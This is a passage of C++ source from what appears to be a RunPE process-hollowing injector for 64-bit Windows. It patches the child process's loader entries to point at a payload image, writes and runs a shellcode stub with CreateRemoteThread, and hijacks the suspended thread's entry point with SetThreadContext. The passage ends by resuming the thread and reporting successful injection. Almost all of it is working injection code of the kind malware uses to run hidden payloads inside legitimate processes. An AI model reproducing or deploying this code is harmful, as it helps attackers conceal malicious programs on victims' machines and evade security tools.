                        ReadProcessMemory(pi.hProcess, (LPCVOID)pLdrAddr, &ldrPtr, sizeof(ULONGLONG), NULL);
                        std::cout << "[RunPE] Debug: New LDR pointer = 0x" << std::hex << ldrPtr << std::dec << "\n";
                        
                        if (ldrPtr != 0) {
                            listHead = ldrPtr + 0x10;
                            ReadProcessMemory(pi.hProcess, (LPCVOID)listHead, &flink, sizeof(ULONGLONG), NULL);
                        }
                    }
                }
            }
            std::cout << "[RunPE] Debug: List head = 0x" << std::hex << listHead << std::dec << "\n";
            std::cout << "[RunPE] Debug: First Flink = 0x" << std::hex << flink << std::dec << "\n";
            std::cout << "[RunPE] Debug: Searching for originalImageBase = 0x" << std::hex << originalImageBase << std::dec << "\n";
            std::cout << "[RunPE] Debug: pRemoteImage = 0x" << std::hex << (ULONGLONG)pRemoteImage << std::dec << "\n";

            // Walk the doubly-linked list of LDR_DATA_TABLE_ENTRY
            // In LDR_DATA_TABLE_ENTRY, InLoadOrderLinks is at offset 0,
            // DllBase is at offset 0x30, SizeOfImage at offset 0x40.
            bool patchedLdr = false;
            ULONGLONG entry = flink;
            for (int i = 0; i < 512 && entry != 0 && entry != listHead; i++) {
                ULONGLONG dllBase = 0;
                ReadProcessMemory(pi.hProcess, (LPCVOID)(entry + 0x30), &dllBase, sizeof(ULONGLONG), NULL);
                
                // Debug: print each entry
                std::cout << "[RunPE] LDR entry " << i << ": dllBase=0x" << std::hex << dllBase << " (looking for 0x" << originalImageBase << ")" << std::dec << std::endl;

                // Match the host's original load address (still recorded in the LDR even
                // after NtUnmapViewOfSection), NOT pRemoteImage (the payload allocation).
                if (dllBase == originalImageBase) {
                    // Redirect DllBase to our new allocation so range checks hit the payload
                    ULONGLONG newDllBase = (ULONGLONG)pRemoteImage;
                    WriteProcessMemory(pi.hProcess, (LPVOID)(entry + 0x30), &newDllBase, sizeof(ULONGLONG), NULL);
                    // Update SizeOfImage to cover the full payload
                    ULONG newSizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
                    WriteProcessMemory(pi.hProcess, (LPVOID)(entry + 0x40), &newSizeOfImage, sizeof(ULONG), NULL);
                    // Also update EntryPoint (offset 0x38)
                    ULONGLONG newEP = (ULONGLONG)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
                    WriteProcessMemory(pi.hProcess, (LPVOID)(entry + 0x38), &newEP, sizeof(ULONGLONG), NULL);
                    std::cout << "[RunPE] Patched LDR entry (base: 0x" << std::hex << originalImageBase << " -> 0x" << newDllBase << ", SizeOfImage: 0x" << newSizeOfImage << std::dec << ")\n";
                    patchedLdr = true;
                    break;
                }

                // Follow Flink to next entry
                ULONGLONG nextFlink = 0;
                ReadProcessMemory(pi.hProcess, (LPCVOID)entry, &nextFlink, sizeof(ULONGLONG), NULL);
                entry = nextFlink;
            }
            if (!patchedLdr)
                std::cout << "[RunPE] Warning: could not find LDR entry to patch\n";
        }

        // -----------------------------------------------------------------------
        // Register the payload's .pdata (exception handler table) via
        // RtlAddFunctionTable injected into the child via a shellcode stub.
        //
        // Without this, C++ exceptions thrown inside the hollowed process cannot
        // be unwound — RtlLookupFunctionEntry finds no entry and the raw exception
        // code (0xe06d7363) leaks out as the process exit code.
        // -----------------------------------------------------------------------
        {
            DWORD exRVA  = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
            DWORD exSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

            if (exRVA != 0 && exSize != 0) {
                ULONGLONG pdataVA   = (ULONGLONG)pRemoteImage + exRVA;
                ULONG     entries   = exSize / 12; // sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)
                ULONGLONG imageBase = (ULONGLONG)pRemoteImage;
                ULONGLONG fnAddr    = (ULONGLONG)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAddFunctionTable");

                // Shellcode: sub rsp,28 | movabs rcx,pdataVA | mov edx,entries |
                //            movabs r8,imageBase | movabs rax,fn | call rax |
                //            add rsp,28 | ret
                uint8_t sc[47] = {
                    0x48,0x83,0xEC,0x28,                         // sub rsp, 28h
                    0x48,0xB9,0,0,0,0,0,0,0,0,                  // movabs rcx, pdataVA
                    0xBA,0,0,0,0,                                // mov edx, entries
                    0x49,0xB8,0,0,0,0,0,0,0,0,                  // movabs r8, imageBase
                    0x48,0xB8,0,0,0,0,0,0,0,0,                  // movabs rax, fnAddr
                    0xFF,0xD0,                                   // call rax
                    0x48,0x83,0xC4,0x28,                         // add rsp, 28h
                    0xC3                                         // ret
                };
                // Byte layout: [0-3]=sub rsp,28 [4-5]=48 B9 [6-13]=pdataVA
                //              [14]=BA [15-18]=entries [19-20]=49 B8
                //              [21-28]=imageBase [29-30]=48 B8 [31-38]=fnAddr
                memcpy(sc + 6,  &pdataVA,   8);
                memcpy(sc + 15, &entries,   4);
                memcpy(sc + 21, &imageBase, 8);
                memcpy(sc + 31, &fnAddr,    8);

                LPVOID pScMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (pScMem) {
                    WriteProcessMemory(pi.hProcess, pScMem, sc, sizeof(sc), NULL);
                    HANDLE hSc = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pScMem, NULL, 0, NULL);
                    if (hSc) { WaitForSingleObject(hSc, 5000); CloseHandle(hSc); }
                    VirtualFreeEx(pi.hProcess, pScMem, 0, MEM_RELEASE);
                    std::cout << "[RunPE] Registered exception table (" << entries << " entries)\n";
                }
            }
        }

        // -----------------------------------------------------------------------
        // Redirect entry point via GetThreadContext / SetThreadContext
        // -----------------------------------------------------------------------
        // The thread is suspended; we can set Rcx to the payload entry.
        // We do NOT modify Rip, so ntdll!RtlUserThreadStart can run LdrInitializeThunk.
        ULONGLONG newEntry = (ULONGLONG)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        {
            CONTEXT ctx = {};
            ctx.ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(pi.hThread, &ctx)) {
                ctx.Rcx = newEntry; // ntdll passes entry point in Rcx before calling it
                if (!SetThreadContext(pi.hThread, &ctx)) {
                    std::cout << "[-] SetThreadContext failed (err=" << GetLastError() << ")\n";
                }
            } else {
                std::cout << "[-] GetThreadContext failed (err=" << GetLastError() << ")\n";
            }
        }

        std::cout << "[RunPE] Successfully mapped. Entry: 0x" << std::hex << newEntry << std::dec << ". Resuming thread...\n";
        ResumeThread(pi.hThread);

        // Wait up to 10s. Windows Error Reporting (WER) keeps the process handle
        // alive while showing the crash dialog, so a short wait gives false positives.
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 10000);
        if (waitResult == WAIT_OBJECT_0) {
            DWORD exitCode = 0;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            std::cout << "[-] Child process died during init (exit: 0x" << std::hex << exitCode << std::dec << ")\n";

            if (exitCode == 0xC0000142)
                std::cout << "[-] STATUS_DLL_INIT_FAILED — a DLL's DllMain returned FALSE or a required DLL failed to load\n";
            else if (exitCode == 0xC0000005)
                std::cout << "[-] STATUS_ACCESS_VIOLATION — relocation or memory protection issue\n";
            else if (exitCode == 0xC0000135)
                std::cout << "[-] STATUS_DLL_NOT_FOUND — target imports a DLL that is not installed\n";

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        std::cout << "[RunPE] Child process alive after 10s — injection successful\n";

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }
}
